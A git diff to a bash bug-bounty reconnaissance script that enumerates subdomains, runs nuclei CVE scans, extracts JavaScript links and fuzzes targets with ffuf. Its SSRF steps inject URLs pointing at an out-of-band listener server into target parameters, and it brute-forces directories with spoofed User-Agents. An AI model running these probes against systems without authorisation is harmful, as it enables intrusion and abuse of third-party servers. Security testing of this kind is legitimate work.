@@ -13,7 +13,11 @@ CUSTOMHEADER='X-HackerOne-Research:storenth'
 NUMBEROFTHREADS=20
 # rate-limit: requests per second
 REQUESTSPERSECOND=5
-
+#-------- ffuf note ---------
+# default rate-limit is 2 req/sec
+# based on @joohoi discussion about internal ffuf stuff: 1 thread with `-p 0.5` sec pause results in to max 2 req/sec anyway
+# for ffuf need to play with -t and -p, e.g.: -t 1 -p 0.5 equal 2req/sec
+#-------- end ---------------
 
 # background PID's control
 PID_SUBFINDER_FIRST=
@@ -238,8 +242,8 @@ dnsprobing(){
     cp  $TARGETDIR/enumerated-subdomains.txt $TARGETDIR/dnsprobe_ip.txt
     dnsx -silent -ptr -resp-only -r $MINIRESOLVERS -l $TARGETDIR/dnsprobe_ip.txt -o $TARGETDIR/dnsprobe_subdomains.txt # also try to get subdomains
   elif [[ -n "$single" ]]; then
-    echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records:"
-    echo $1 | dnsx -silent -a -resp-only -o $TARGETDIR/dnsprobe_ip.txt
+    echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records..."
+    echo $1 | dnsx -silent -retry 2 -a -resp-only -o $TARGETDIR/dnsprobe_ip.txt
     echo $1 > $TARGETDIR/dnsprobe_subdomains.txt
   elif [[ -n "$list" ]]; then
       echo "[$(date | awk '{ print $4}')] [massdns] probing and wildcard sieving..."
@@ -247,7 +251,7 @@ dnsprobing(){
       puredns -r $MINIRESOLVERS resolve $TARGETDIR/enumerated-subdomains.txt --wildcard-batch 100000 -l 5000 -w $TARGETDIR/resolved-list.txt
       # # additional resolving because shuffledns/pureDNS missing IP on output
       echo
-      echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records:"
+      echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records..."
       # -t mean cuncurrency
       dnsx -silent -retry 2 -t 250 -a -resp -r $MINIRESOLVERS -l $TARGETDIR/resolved-list.txt -o $TARGETDIR/dnsprobe_out.txt
       # clear file from [ and ] symbols
@@ -261,7 +265,7 @@ dnsprobing(){
       # shuffledns -silent -d $1 -list $TARGETDIR/2-all-subdomains.txt -retries 5 -r $MINIRESOLVERS -o $TARGETDIR/shuffledns-list.txt
       # additional resolving because shuffledns missing IP on output
       echo
-      echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records:"
+      echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records..."
       # -t mean cuncurrency
       dnsx -silent -retry 2 -t 250 -a -resp -r $MINIRESOLVERS -l $TARGETDIR/resolved-list.txt -o $TARGETDIR/dnsprobe_out.txt
 
@@ -366,9 +370,6 @@ pagefetcher(){
         # extract domains
         < $TARGETDIR/page-fetched/pagefetcher_output.txt unfurl --unique domains | grep -E "(([[:alnum:][:punct:]]+)+)?[.]?$1" | sort -u | \
                       $httpxcall >> $TARGETDIR/3-all-subdomain-live-scheme.txt
-
-        # sort new assets
-        sort -u $TARGETDIR/3-all-subdomain-live-scheme.txt -o $TARGETDIR/3-all-subdomain-live-scheme.txt
     fi
     echo "[$(date | awk '{ print $4}')] [page-fetch] done."
   fi
@@ -391,7 +392,9 @@ nucleitest(){
     # use -c for maximum templates processed in parallel
     nuclei -silent -H "$CUSTOMHEADER" -rl "$REQUESTSPERSECOND" -l $TARGETDIR/3-all-subdomain-live-scheme.txt -t $HOMEDIR/nuclei-templates/technologies/ -o $TARGETDIR/nuclei/nuclei_output_technology.txt
     echo "[$(date | awk '{ print $4}')] [nuclei] CVE testing..."
-    nuclei -silent -H "$CUSTOMHEADER" -rl "$REQUESTSPERSECOND" -o $TARGETDIR/nuclei/nuclei_output.txt \
+    nuclei -silent -iserver "https://$LISTENSERVER" \
+          -H "$CUSTOMHEADER" -rl "$REQUESTSPERSECOND" \
+          -o $TARGETDIR/nuclei/nuclei_output.txt \
                     -l $TARGETDIR/3-all-subdomain-live-scheme.txt \
                     -exclude-templates $HOMEDIR/nuclei-templates/misconfiguration/http-missing-security-headers.yaml \
                     -exclude-templates $HOMEDIR/nuclei-templates/miscellaneous/old-copyright.yaml \
@@ -432,10 +435,13 @@ nucleitest(){
 
 
 # prepare custom wordlist for
-# ssrf test --mad only mode
-# directory bruteforce using --mad and --brute mode only
+# ssrf test --fuzz only mode
+# directory bruteforce using --fuzz and/or --brute mode only
 custompathlist(){
-  < $TARGETDIR/3-all-subdomain-live-scheme.txt unfurl format '%d:%P' | tee $TARGETDIR/3-all-subdomain-live-socket.txt | sed "s/:[[:digit:]]*//" | sort -u > $TARGETDIR/3-all-subdomain-live.txt
+  # sort new assets
+  sort -u $TARGETDIR/3-all-subdomain-live-scheme.txt -o $TARGETDIR/3-all-subdomain-live-scheme.txt
+  # get only hostnames from full socket addresses
+  < $TARGETDIR/3-all-subdomain-live-scheme.txt unfurl format '%d:%P' | sed "s/:$//" | tee $TARGETDIR/3-all-subdomain-live-socket.txt |  sed -E "s/:([[:digit:]]+)?$//" | sort -u > $TARGETDIR/3-all-subdomain-live.txt
 
   echo
   echo "[$(date | awk '{ print $4}')] Prepare custom lists"
@@ -458,7 +464,7 @@ custompathlist(){
 
   if [[ -n "$fuzz" ]]; then
     # linkfinder & secretfinder
-    grep -ioE "(([[:alnum:][:punct:]]+)+)[.](js|json)" $FILTEREDFETCHEDLIST | "$CHECKHTTPX2XX" > $TARGETDIR/tmp/js-list.txt || true
+    grep -ioE "(([[:alnum:][:punct:]]+)+)[.](js|json)" $FILTEREDFETCHEDLIST | $CHECKHTTPX2XX > $TARGETDIR/tmp/js-list.txt || true
 
     if [ -s $TARGETDIR/tmp/js-list.txt ]; then
 
@@ -502,6 +508,7 @@ custompathlist(){
                   grep -ioE "((https?:\/\/)|www\.)(([[:alnum:][:punct:]]+)+)?[.]?(([[:alnum:][:punct:]]+)+)[.](js|json)" $TARGETDIR/tmp/linkfinder-concatenated-path-list.txt >> $TARGETDIR/tmp/linkfinder-js-list.txt || true
                   # prepare additional path for bruteforce
                   if [[ -n "$brute" ]]; then
+                      echo "[debug-2] linkfinder: bruteforce collected paths"
                       grep -vioE "((https?:\/\/)|www\.)(([[:alnum:][:punct:]]+)+)?[.]?(([[:alnum:][:punct:]]+)+)[.](js|json)" $TARGETDIR/tmp/linkfinder-concatenated-path-list.txt > $TARGETDIR/tmp/linkfinder-path-list.txt || true
                       httpx -silent -no-color -random-agent -status-code -content-length -threads "$NUMBEROFTHREADS" -rate-limit $REQUESTSPERSECOND -l $TARGETDIR/tmp/linkfinder-path-list.txt -o $TARGETDIR/tmp/linkfinder-path-list-brute-output.txt
                   fi
@@ -512,7 +519,7 @@ custompathlist(){
                 sort -u $TARGETDIR/tmp/linkfinder-js-list.txt -o $TARGETDIR/tmp/linkfinder-js-list.txt
                 echo "[debug-3] linkfinder: filter out scope"
                 # filter out in scope
-                  xargs -P 20 -n 1 -I {} grep "{}" $TARGETDIR/tmp/linkfinder-js-list.txt < $TARGETDIR/3-all-subdomain-live.txt | "$CHECKHTTPX2XX" >> $TARGETDIR/tmp/js-list.txt || true
+                  xargs -P 20 -n 1 -I {} grep "{}" $TARGETDIR/tmp/linkfinder-js-list.txt < $TARGETDIR/3-all-subdomain-live.txt | $CHECKHTTPX2XX >> $TARGETDIR/tmp/js-list.txt || true
                   sort -u $TARGETDIR/tmp/js-list.txt -o $TARGETDIR/tmp/js-list.txt
               fi
         fi
@@ -548,7 +555,7 @@ custompathlist(){
     # 2 limited to [:alnum:]=file.ext pattern
     grep -oiaE -e "(([[:alnum:][:punct:]]+)+)?=(([[:alnum:][:punct:]]+)+)\.(pdf|txt|log|md|php|json|csv|src|bak|old|jsp|sql|zip|xls|dll)" \
                -e "(([[:alnum:][:punct:]]+)+)?(php3?)\?[[:alnum:]]+=([[:alnum:][:punct:]]+)?" $FILTEREDFETCHEDLIST | \
-               grep -oiaE -e "(([[:alnum:][:punct:]]+)+)=" -e "(([[:alnum:][:punct:]]+)+)\?[[:alnum:]]+=" | qsreplace -a  >> $customLfiQueryList || true
+               grep -oiaE -e "((https?:\/\/)|www\.)(([[:alnum:][:punct:]]+)+)=" -e "((https?:\/\/)|www\.) (([[:alnum:][:punct:]]+)+)\?[[:alnum:]]+=" | qsreplace -a  >> $customLfiQueryList || true
     sort -u $customLfiQueryList -o $customLfiQueryList
 
     < $customSsrfQueryList unfurl format '%p%?%q' | sed "/^\/\;/d;/^\/\:/d;/^\/\'/d;/^\/\,/d;/^\/\./d" | qsreplace -a > $TARGETDIR/ssrf-path-list.txt
@@ -570,23 +577,24 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[$(date | awk '{ print $4}')] [SSRF-2] Blind probe..."
-    xargs -P 2 -I {} ffuf -s -timeout 1 -ignore-body -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
-                         -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-                         -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
-                         -t 1 \ # number of cuncurrent thread = 1 because same host each request
-                         -rate "$REQUESTSPERSECOND" \
-                         -H "$CUSTOMHEADER" \
-                         -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" \
-                         -mode pitchfork < $PARAMSLIST > /dev/null
+        ffuf -s -timeout 1 -ignore-body -u HOST/\?url=https://${LISTENSERVER}/DOMAIN/{} \
+            -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+            -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
+            -t 1 \
+            -p 0.5 \
+            -H "$CUSTOMHEADER" \
+            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" \
+            -mode pitchfork > /dev/null
     echo "[$(date | awk '{ print $4}')] [SSRF-2] done."
     echo
     if [[ -s "$customSsrfQueryList" ]]; then
       echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
       ENDPOINTCOUNT=$(< $customSsrfQueryList wc -l)
       echo "requests count = $ENDPOINTCOUNT"
-          ffuf -s -timeout 1 -ignore-body -u HOST${LISTENSERVER} -w $customSsrfQueryList:HOST \
-               -t 1 \ # number of cuncurrent thread = 1 because same host each request
-               -rate "$REQUESTSPERSECOND" \
+          ffuf -s -timeout 1 -ignore-body -u HOST${LISTENSERVER} \
+               -w $customSsrfQueryList:HOST \
+               -t 1 \
+               -p 0.5 \
                -H "$CUSTOMHEADER" \
                -H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" \
                > /dev/null
@@ -611,11 +619,12 @@ ssrftest(){
 
           ffuf -s -timeout 1 -ignore-body -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
-              -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
+              -w $TARGETDIR/ssrf-list.txt:PATH \
               -t "$NUMBEROFTHREADS" \
               -rate "$REQUESTSPERSECOND" \
               -H "$CUSTOMHEADER" \
-              -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
+              -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" \
+              > /dev/null
 
       echo "[$(date | awk '{ print $4}')] [SSRF-5] done."
     fi
@@ -714,8 +723,8 @@ ffufbrute(){
     ffuf -s -timeout 5 -u HOSTPATH -mc 200,201,202,401 \
          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
          -w $APIWORDLIST:PATH \
-         -t $NUMBEROFTHREADS \
-         -rate "$REQUESTSPERSECOND" \
+         -t 2 \
+         -p 0.5 \
          -H "$CUSTOMHEADER" \
          -H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4" \
          -o $TARGETDIR/ffuf/api-brute.html -of html -or true
@@ -726,9 +735,8 @@ ffufbrute(){
     # interlace --silent -tL $TARGETDIR/3-all-subdomain-live-scheme.txt -threads 10 -c "ffuf -timeout 7 -u _target_/FUZZ -mc 200,201,202,401 -fs 0 \-w $customFfufWordList -t $NUMBEROFTHREADS -p 0.5-2.5 -recursion -recursion-depth 2 -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36\" \-o $TARGETDIR/ffuf/_cleantarget_.html -of html -or true"
     ffuf -timeout 7 -u HOST/PATH -mc 200,201,202,401 -fs 0 -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
           -w $customFfufWordList:PATH \
-          -t $NUMBEROFTHREADS \ 
-          -p 0.5-2.5 \
-          -rate "$REQUESTSPERSECOND" \
+          -t 2 \
+          -p 0.5 \
           -H "$CUSTOMHEADER" \
           -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
           -o $TARGETDIR/ffuf/directory-brute.html -of html -or true
